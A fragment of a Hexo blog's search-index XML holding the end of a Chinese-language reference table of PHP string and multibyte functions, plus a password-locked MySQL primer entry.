<td align="left">$str = “Hello world. (can you hear me?)”; echo quotemeta($str);</td>
</tr>
<tr>
<td align="center">chr()</td>
<td align="left">从指定的 ASCII 值返回字符</td>
<td align="left">echo chr(052);</td>
</tr>
<tr>
<td align="center">ord()</td>
<td align="left">返回字符串第一个字符的 ASCII值</td>
<td align="left">echo ord(“hello”);</td>
</tr>
<tr>
<td align="center">strcasecmp()</td>
<td align="left">不区分大小写比较两字符串</td>
<td align="left">echo strcasecmp(“Hello world!”,”HELLO WORLD!”);</td>
</tr>
<tr>
<td align="center">strcmp()</td>
<td align="left">区分大小写比较两字符串</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">strncmp()</td>
<td align="left">比较字符串前n个字符,区分大小写</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">strncasecmp()</td>
<td align="left">比较字符串前n个字符,不区分大小写</td>
<td align="left">int strncasecmp ( string $str1 , string $str2 , int $len )</td>
</tr>
<tr>
<td align="center">strnatcmp()</td>
<td align="left">自然顺序法比较字符串长度,区分大小写</td>
<td align="left">int strnatcmp ( string $str1 , string $str2 )</td>
</tr>
<tr>
<td align="center">strnatcasecmp()</td>
<td align="left">自然顺序法比较字符串长度,不区分大小写</td>
<td align="left">int strnatcasecmp ( string $str1 , string $str2 )</td>
</tr>
<tr>
<td align="center">chunk_split()</td>
<td align="left">将字符串分成小块</td>
<td align="left">str chunk_split(str $body[,int $len[,str $end]])</td>
</tr>
<tr>
<td align="center">strtok()</td>
<td align="left">切开字符串</td>
<td align="left">str strtok(str $str,str $token)</td>
</tr>
<tr>
<td align="center">explode()</td>
<td align="left">使用一个字符串为标志分割另一个字符串</td>
<td align="left">array explode(str $sep,str $str[,int $limit])</td>
</tr>
<tr>
<td align="center">implode()</td>
<td align="left">同join,将数组值用预订字符连接成字符串</td>
<td align="left">string implode ( string $glue , array $pieces )</td>
</tr>
<tr>
<td align="center">substr()</td>
<td align="left">截取字符串</td>
<td align="left">string substr ( string $string , int $start [, int $length ] )</td>
</tr>
<tr>
<td align="center">str_replace()</td>
<td align="left">字符串替换操作,区分大小写</td>
<td align="left">mix str_replace(mix $search,,mix $replace,mix $subject[,int &amp;$num])</td>
</tr>
<tr>
<td align="center">str_ireplace()</td>
<td align="left">字符串替换操作,不区分大小写</td>
<td align="left">mix str_ireplace ( mix $search , mix $replace , mix $subject [, int &amp;$count ] )</td>
</tr>
<tr>
<td align="center">substr_count()</td>
<td align="left">统计一个字符串,在另一个字符串中出现次数</td>
<td align="left">int substr_count ( string $haystack , string $needle [, int $offset = 0 [, int $length ]] )</td>
</tr>
<tr>
<td align="center">substr_replace()</td>
<td align="left">替换字符串中某串为另一个字符串</td>
<td align="left">mixed substr_replace ( mixed $string , string $replacement , int $start [, int $length ] )</td>
</tr>
<tr>
<td align="center">similar_text()</td>
<td align="left">返回两字符串相同字符的数量</td>
<td align="left">int similar_text(str $str1,str $str2)</td>
</tr>
<tr>
<td align="center">strchr()</td>
<td align="left">返回一个字符串在另一个字符串中开始位置到结束的字符串</td>
<td align="left">string strstr ( string $str, string $needle , bool $before_needle )</td>
</tr>
<tr>
<td align="center">strrchr()</td>
<td align="left">返回一个字符串在另一个字符串中最后一次出现位置开始到末尾的字符串</td>
<td align="left">string strrchr ( string $haystack , mixed $needle )</td>
</tr>
<tr>
<td align="center">stristr()</td>
<td align="left">返回一个字符串在另一个字符串中开始位置到结束的字符串，不区分大小写</td>
<td align="left">string stristr ( string $haystack , mixed $needle [, bool $before_needle = false ] )</td>
</tr>
<tr>
<td align="center">strtr()</td>
<td align="left">转换字符串中的某些字符</td>
<td align="left">string strtr ( string $str , string $from , string $to )</td>
</tr>
<tr>
<td align="center">strpos()</td>
<td align="left">寻找字符串中某字符最先出现的位置</td>
<td align="left">int strpos ( string $haystack , mixed $needle [, int $offset = 0 ] )</td>
</tr>
<tr>
<td align="center">stripos()</td>
<td align="left">寻找字符串中某字符最先出现的位置,不区分大小写</td>
<td align="left">int stripos ( string $haystack , string $needle [, int $offset ] )</td>
</tr>
<tr>
<td align="center">strrpos()</td>
<td align="left">寻找某字符串中某字符最后出现的位置</td>
<td align="left">int strrpos ( string $haystack , string $needle [, int $offset = 0 ] )</td>
</tr>
<tr>
<td align="center">strripos()</td>
<td align="left">寻找某字符串中某字符最后出现的位置,不区分大小写</td>
<td align="left">int strripos ( string $haystack , string $needle [, int $offset ] )</td>
</tr>
<tr>
<td align="center">strspn()</td>
<td align="left">返回字符串中首次符合mask的子字符串长度</td>
<td align="left">int strspn ( string $str1 , string $str2 [, int $start [, int $length ]] )</td>
</tr>
<tr>
<td align="center">strcspn()</td>
<td align="left">返回字符串中不符合mask的字符串的长度</td>
<td align="left">int strcspn ( string $str1 , string $str2 [, int $start [, int $length ]] )</td>
</tr>
<tr>
<td align="center">str_word_count()</td>
<td align="left">统计字符串含有的单词数</td>
<td align="left">mix str_word_count(str $str,[])</td>
</tr>
<tr>
<td align="center">strlen()</td>
<td align="left">统计字符串长度</td>
<td align="left">int strlen(str $str)</td>
</tr>
<tr>
<td align="center">count_chars()</td>
<td align="left">统计字符串中所有字母出现次数(0..255)</td>
<td align="left">mixed count_chars ( string $string [, int $mode ] )</td>
</tr>
<tr>
<td align="center">md5()</td>
<td align="left">字符串md5编码</td>
<td align="left">$str = “Hello”; echo md5($str)</td>
</tr>
<tr>
<td align="center"><font color="red"><strong>iconv：</strong></font></td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="center">mb_substr</td>
<td align="left">获取字符串的部分</td>
<td align="left">string mb_substr ( string $str , int $start [, int $length = NULL [, string $encoding = mb_internal_encoding() ]] )</td>
</tr>
<tr>
<td align="center">mb_http_output</td>
<td align="left">设置/获取 HTTP 输出字符编码</td>
<td align="left">mixed mb_http_output ([ string $encoding = mb_http_output() ] )</td>
</tr>
<tr>
<td align="center">mb_strlen</td>
<td align="left">获取字符串的长度</td>
<td align="left">mixed mb_strlen ( string $str [, string $encoding = mb_internal_encoding() ] )</td>
</tr>
<tr>
<td align="center">iconv</td>
<td align="left">字符串按要求的字符编码来转换</td>
<td align="left">string iconv ( string $in_charset , string $out_charset , string $str )</td>
</tr>
<tr>
<td align="center">iconv_substr</td>
<td align="left">截取字符串的部分</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">iconv_get_encoding</td>
<td align="left">获取 iconv 扩展的内部配置变量</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">mb_substr_count</td>
<td align="left">统计字符串出现的次数</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">mb_check_encoding</td>
<td align="left">检查字符串在指定的编码里是否有效</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">mb_strrpos</td>
<td align="left">查找字符串在一个字符串中最后出现的位置</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">mb_split</td>
<td align="left">使用正则表达式分割多字节字符串</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">parse_url</td>
<td align="left">解释URL成为一个数组</td>
<td align="left"></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP语言</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL入门</title>
    <url>/post/MySQL-Primer/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Welcome to my blog, enter password to read.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="7734ab33ae522e9c83c57f574936c030a71be8746dab10bd513ce8a495554ebd"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>PHP语言</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
</search>
